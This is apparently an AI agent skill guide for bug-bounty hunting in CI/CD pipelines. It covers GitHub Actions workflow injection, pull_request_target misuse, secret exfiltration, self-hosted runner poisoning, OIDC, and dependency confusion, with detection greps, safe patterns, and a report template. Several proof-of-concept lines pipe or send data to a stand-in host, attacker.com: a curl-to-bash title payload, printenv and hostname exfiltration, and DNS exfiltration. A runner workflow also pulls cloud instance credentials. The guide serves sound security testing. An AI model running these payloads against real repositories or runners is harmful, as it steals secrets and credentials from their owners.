---
name: cicd-security
description: CI/CD pipeline security hunting — GitHub Actions workflow injection, secret exfiltration, self-hosted runner poisoning, dependency confusion, OIDC token theft, and supply chain attacks. Covers sisakulint scanning, manual workflow analysis, and chaining CI/CD bugs into critical findings. Use when a target has public repos, GitHub Actions, CircleCI, Jenkins, or GitLab CI.
---

# CI/CD SECURITY — Pipeline Attack Surface

> CI/CD pipelines are high-value targets — a single workflow injection can give you code execution on the build server, read ALL org secrets, and push backdoored releases to production.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run cicd_scanner.sh <owner/repo> — catch low-hanging workflow lint issues
[ ] Check for script injection: ${{ github.event.*.body/title/name }}
[ ] Find secrets referenced in env: — test if they leak in logs
[ ] Check pull_request_target with checkout of untrusted code
[ ] Look for self-hosted runners on public repos
[ ] Search for OIDC token requests without audience restriction
[ ] Check for unpinned actions (uses: owner/action@main)
[ ] Look for workflow_dispatch with no input validation
[ ] Find artifact downloads without integrity checks
[ ] Search for GITHUB_TOKEN with write permission used insecurely
```

---

## 1. TOOL — cicd_scanner.sh

```bash
# Single repo
bash bughunter/tools/cicd_scanner.sh owner/repo

# Org-wide (up to 30 repos)
bash bughunter/tools/cicd_scanner.sh "org:orgname" --limit 50 --parallel 5

# Scan with recursive reusable workflow analysis
bash bughunter/tools/cicd_scanner.sh owner/repo --recursive --depth 5

# Custom output
bash bughunter/tools/cicd_scanner.sh owner/repo --output-dir ./findings/target/cicd
```

**Output:** `findings/<target>/cicd/scan_results.txt` + `summary.txt`

**What sisakulint finds:**
- Script injection via untrusted context
- Unpinned actions (tag instead of SHA)
- `pull_request_target` misuse
- Dangerous patterns (`eval`, `curl | bash`, etc.)
- Exposed secret names in `run:` blocks

---

## 2. WORKFLOW INJECTION (Critical — Most Common Paid Bug)

### What It Is
GitHub Actions exposes PR/issue data as context variables. If injected into a `run:` block without sanitization, an attacker controls shell code.

### Vulnerable Pattern
```yaml
# VULNERABLE — attacker controls pr.title
- name: Print PR title
  run: echo "Title: ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl attacker.com/shell.sh | bash #"
```

### Safe Pattern
```yaml
# SAFE — pass through env var, never interpolate directly
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

### Injectable Contexts (always check these)
```
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref        ← branch names
github.event.issue.title
github.event.issue.body
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.discussion.title
github.event.discussion.body
github.head_ref                            ← alias for branch name
github.event.inputs.*                      ← workflow_dispatch inputs
```

### PoC Payload
```
# PR title / issue title payload:
"; wget -q -O- attacker.com/$(cat /etc/hostname | base64) #
```

### Detection Grep
```bash
# Find injectable patterns in .github/workflows/
grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn '\${{.*github\.event\.inputs' .github/workflows/
```

---

## 3. pull_request_target MISUSE (Critical)

### What It Is
`pull_request_target` runs in the context of the BASE repo (has secrets) but can be tricked into checking out and running attacker code.

### Vulnerable Pattern
```yaml
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← attacker code!
      - run: npm test  # runs attacker's package.json scripts
```

### Why It's Critical
- `pull_request_target` has access to secrets
- Checkout uses the PR's code
- Any `run:` step executes attacker-controlled code with access to all org secrets

### Detection
```bash
grep -rn 'pull_request_target' .github/workflows/
# Then check if the same job does a checkout of the PR head
grep -A 20 'pull_request_target' .github/workflows/*.yml | grep -E '(head\.sha|head_ref|checkout)'
```

---

## 4. SECRET EXFILTRATION

### Secrets That Appear in Logs
```bash
# Search for secrets echoed in run: blocks
grep -rn 'echo.*secrets\.' .github/workflows/
grep -rn 'cat.*secrets\.' .github/workflows/
grep -rn 'env.*secrets\.' .github/workflows/ | grep -v '^#'
```

### GITHUB_TOKEN Abuse
The auto-generated `GITHUB_TOKEN` can be used to:
- Push code to branches
- Create releases
- Read all private repo content
- Approve PRs (if permissions allow)

```yaml
# Check for overly broad permissions
permissions:
  contents: write    # ← Can push/delete code
  packages: write    # ← Can push malicious packages
  pull-requests: write
```

### PoC — Exfil via DNS
```bash
# In an injected run: block
curl "https://attacker.com/?d=$(printenv | base64 -w0)"
# Or via DNS (more stealthy)
nslookup "$(printenv SECRET | md5sum | cut -c1-20).attacker.com"
```

---

## 5. SELF-HOSTED RUNNER POISONING

### Why It Matters
Public repos with self-hosted runners allow ANY fork to queue jobs on internal machines.

### Detection
```bash
# In workflow files
grep -rn 'self-hosted' .github/workflows/
# Combined with — does the repo accept PRs from forks?
# Pull triggers that run on self-hosted
grep -B5 'self-hosted' .github/workflows/*.yml | grep -E '(pull_request|push)'
```

### Exploit Path
1. Fork public repo that uses self-hosted runners
2. Open PR with malicious workflow step
3. Job runs on internal self-hosted runner
4. Access internal network, read instance metadata, exfil secrets

### PoC Workflow Addition
```yaml
# Attacker adds to fork:
jobs:
  pwn:
    runs-on: self-hosted
    steps:
      - name: Recon
        run: |
          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
            | xargs -I{} curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}
```

---

## 6. OIDC TOKEN THEFT / CLOUD CREDENTIAL ABUSE

### What It Is
GitHub Actions can request short-lived cloud credentials via OIDC. Misconfigured trust policies allow any branch/repo to claim elevated AWS/GCP/Azure roles.

### Detection
```bash
# Find OIDC usage
grep -rn 'id-token.*write\|configure-aws-credentials\|google-github-actions\|azure/login' .github/workflows/
```

### Exploit: Overly Broad AWS Trust Policy
```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:org/*:*"
    }
  }
}
```
→ Any branch in the org can assume this role.

### What to Check
```
1. What role does the workflow assume? (aws:role: ARN in workflow or secrets)
2. Is the trust policy scoped to a specific branch? (ref:refs/heads/main)
3. Can you trigger this from a fork or feature branch?
4. What permissions does the role have?
```

---

## 7. DEPENDENCY CONFUSION / SUPPLY CHAIN

### Unpinned Actions
```yaml
# VULNERABLE — could be hijacked if maintainer's account is compromised
uses: actions/checkout@v3

# SAFE — pinned to a specific commit SHA
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

### Dependency Confusion Attack
1. Find `package.json` or `requirements.txt` that references internal packages
2. Check if the internal package name is published on npm/PyPI
3. Publish a malicious package with a higher version number
4. Build server installs the public (malicious) one instead

### Detection
```bash
# Find internal package names in config files
grep -rn '"registry"' package.json .npmrc
grep -rn 'index-url\|extra-index-url' requirements.txt pip.conf setup.py
# Check if those package names exist on public registries
```

---

## 8. BUG CLASS TABLE

| Bug | Trigger | Severity | CVSS Range |
|-----|---------|----------|-----------|
| Workflow injection via PR title | `${{ github.event.pull_request.title }}` in `run:` | Critical | 9.0–10.0 |
| `pull_request_target` + checkout | Accepts PRs from forks | Critical | 9.0–10.0 |
| Self-hosted runner on public repo | `runs-on: self-hosted` + public repo | High | 7.5–9.0 |
| OIDC trust too broad | Any-branch/any-repo claim | High | 7.5–8.5 |
| Secret in log | `echo ${{ secrets.X }}` | Medium | 5.5–7.0 |
| Unpinned action | `@main` / `@v1` tag | Low–Medium | 3.0–5.5 |
| Artifact poisoning | Unsigned artifact download + exec | Medium | 5.5–7.0 |
| `GITHUB_TOKEN` write abuse | Push to protected branch | Medium | 5.5–7.0 |
| Dependency confusion | Internal pkg not on public registry | High | 7.5–9.0 |
| `workflow_dispatch` injection | Unvalidated inputs in `run:` | Medium–High | 6.0–8.0 |

---

## 9. CHAINING CI/CD BUGS

### Chain A: IDOR → CI/CD Secret Read
```
1. IDOR on /api/repos/{id}/settings → read CI/CD config
2. Config references internal secret names
3. Workflow injection to exfil those secrets
→ Impact: Full org secret exfiltration
```

### Chain B: XSS → GitHub Token Theft
```
1. Stored XSS on internal GitHub Enterprise
2. JS payload reads document.cookie / localStorage for GITHUB_TOKEN
3. Token used to trigger workflow with malicious inputs
→ Impact: RCE on build infrastructure
```

### Chain C: Supply Chain → Production Push
```
1. Find unpinned action (e.g., uses: corp/internal-action@main)
2. Fork or compromise corp/internal-action
3. Merge malicious code
4. Next CI run pulls the compromised action with full repo write access
→ Impact: Code execution, backdoored releases
```

---

## 10. REPORT TEMPLATE

```markdown
## Summary
GitHub Actions workflow in `<repo>` is vulnerable to **workflow injection** via the
`github.event.pull_request.title` context variable, which is interpolated directly
into a `run:` shell block. An attacker who opens a specially crafted PR can achieve
arbitrary code execution on the build runner with full access to all repository secrets.

## Steps to Reproduce
1. Fork `<repo>`
2. Open a PR with the following title:
   `"; curl -s attacker.com/$(cat /etc/hostname | base64 -w0 | head -c 40) #`
3. The CI workflow `.github/workflows/<name>.yml` runs and executes the injected command.
4. Observe DNS/HTTP callback to attacker.com with hostname (or secret payload).

## Impact
- RCE on build runner
- Read of all `${{ secrets.* }}` available to the workflow
- Ability to push malicious code to repository or publish backdoored packages
- Pivot to internal network if runner is self-hosted

## Remediation
Replace direct context interpolation with environment variable assignment:
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"

## CVSS
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (Critical, 10.0)
```

---

## 11. SCOPE NOTES

- Most bug bounty programs scope **public** repos only — confirm before touching private org repos.
- Self-hosted runner attacks require a successful workflow run, which means opening a real PR — confirm the program allows this.
- Never trigger a workflow that could affect production infrastructure without explicit written permission.
- Always check `SECURITY.md` or the program policy for CI/CD-specific scope language.

---

## 12. TOOLS REFERENCE

| Tool | Purpose | Install |
|------|---------|---------|
| `sisakulint` | Lint GitHub Actions workflows for security issues | `bash install_tools.sh` |
| `trufflehog` | Find secrets leaked in git history / workflow logs | `bash install_tools.sh` |
| `gitleaks` | Scan repos for hardcoded secrets | `bash install_tools.sh` |
| `gh` CLI | Download workflow logs, list secrets, trigger runs | `brew install gh` |
| `nuclei` | CI/CD-specific templates | `-tags cicd` |
| `secrets_hunter.sh` | Wrapper for all three secret scanners | `bash bughunter/tools/secrets_hunter.sh` |

```bash
# Download public workflow run logs (no auth needed)
gh run list --repo owner/repo --limit 10
gh run view <run-id> --log --repo owner/repo

# List exposed secret names (names only — values never shown by API)
gh secret list --repo owner/repo
```

## V3 enrichment — security-dependency-secrets (Ultimate Agent Skills V3, 2026-11-20)

### Dependency & secrets inventory (defensif)

This skill hunts CI/CD pipeline and supply-chain attacks *offensively* (workflow injection, secret exfiltration, runner poisoning, dependency confusion). This section adds the *defensive inventory* side for our own repos — it does not change any hunting rule and does not expand bounty scope:

- **Build inventory:** list every dependency and its version — an SBOM for the repo, not a guess from memory.
- **Inspect approved local code and lockfiles:** check the lockfile (not just the manifest) for what is actually installed; verify which versions are affected by a known issue and which fix applies.
- **Redact secrets:** scan for exposed secrets and redact them from logs, reports, and shared output — secret *values* never appear in a finding or a report.
- **Verify affected versions and fixes:** confirm the vulnerable version range and the fixed version before claiming a dependency is (or is not) a problem.

Tooling: gitleaks (already in this skill's tool table), osv-scanner, trivy, syft.

Sumber: ~/workspace/ultimate-agent-v3/.agents/skills/security-dependency-secrets/SKILL.md

## SUPER MAXIMUS enrichment — Wave 2 — cicd-security upstream + deteksi/respons (cybersecurity)

Sumber: briiirussell/cybersecurity-skills @ b1987542 (MIT).
Skill upstream `cicd-security` (briiirussell) terdaftar reference-only di registry
(id `cybersecurity-cicd-security` — ID tabrakan dengan skill ini, jadi TIDAK dibuat
direktori duplikat; file lengkap di vendor `cybersecurity/skills/cicd-security/SKILL.md`).
Ringkasan pengayaan: Audit CI/CD pipelines (GitHub Actions; GitLab CI and CircleCI briefly) for paths giving an outsider code execution, secrets or a write token: pull_request_target and workflow_run running untrusted code, expression injection, missing or broad permissions, third-party actions not pinned to a SHA or lockfile, OIDC trust with wildcard subjects, self-hosted runners on public repos, secrets reaching forks, cache and artifact trust, and AI agents in CI reading issue or PR text with a write token, sandbox or not. Runs zizmor and actionlint read-only, writes findings.json. Use when the user mentions 'pull_request_target,' 'pwn request,' 'workflow injection,' 'zizmor,' 'actionlint,' 'pin actions to SHA,' 'actions.lock,' 'workflow lockfile,' 'GITHUB_TOKEN permissions,' 'self-hosted runner,' 'ACTIONS_RUNTIME_TOKEN,' 'stolen write token,' 'bot bypasses branch protection,' 'claude-code-action,' 'AI agent in CI,' 'GitLab CI security,' 'CircleCI security,' 'is this workflow safe,' or needs to secure a build pipeline.
Kapabilitas baru yang dicatat dari repo yang sama (bukan duplikat skill ini):
- **siem-detection** (registry: `siem-detection`): Engineer and audit SIEM detection rules — log source coverage, Sigma / KQL / SPL / Elastic query authoring, MITRE ATT&CK mapping, false-positive tuning, and detection-as-code workflows. Use when the user mentions 'SIEM,' 'detection engineering,' 'detection rules,' 'Sigma,' 'KQL,' 'SPL,' 'Splunk,' 'Sentinel,' 'Elastic,' 'Wazuh,' 'Chronicle,' 'detection-as-code,' 'MITRE ATT&CK mapping,' 'log coverage,' 'alert tuning,' 'use case development,' 'agent process ancestry,' or needs help building or improving security detections.
- **incident-triage** (registry: `incident-triage`): Guide rapid triage and initial response to a live security incident happening right now (ransomware hitting a file server, an attacker still in the network, a new admin user nobody created, a host compromised through a CVE, or a SaaS vendor you use that was breached) following NIST SP 800-61 Rev. 3 (CSF 2.0 Respond and Recover) — declare, validate and prioritize, contain, preserve evidence, scope, extract IOCs, start the notification clocks, and hand off to eradication, recovery and lessons learned. Use when the user mentions 'incident response,' 'security incident,' 'incident triage,' 'active incident,' 'we've been hacked,' 'we've been breached,' 'compromised,' 'ransomware,' 'contain the incident,' 'malware detected,' 'suspicious activity,' 'IOC,' 'indicators of compromise,' 'vendor breach,' 'told to rotate keys,' 'coding agent ran it,' 'Railway RCA,' 'vendor build history,' 'vendor AI breach,' 'zero data retention,' 'Notion Insights,' 'Fireworks breach,' or needs help handling a security event.
- **Governance/compliance** — repo cybersecurity membawa kapabilitas governance &
  compliance serta deteksi/respons yang belum ada di skill lokal; bila pipeline butuh
  kontrol governance (kebijakan, bukti kepatuhan) atau respons insiden, rujuk skill-skill
  itu, jangan memperluas skill ini menjadi penilai kepatuhan.
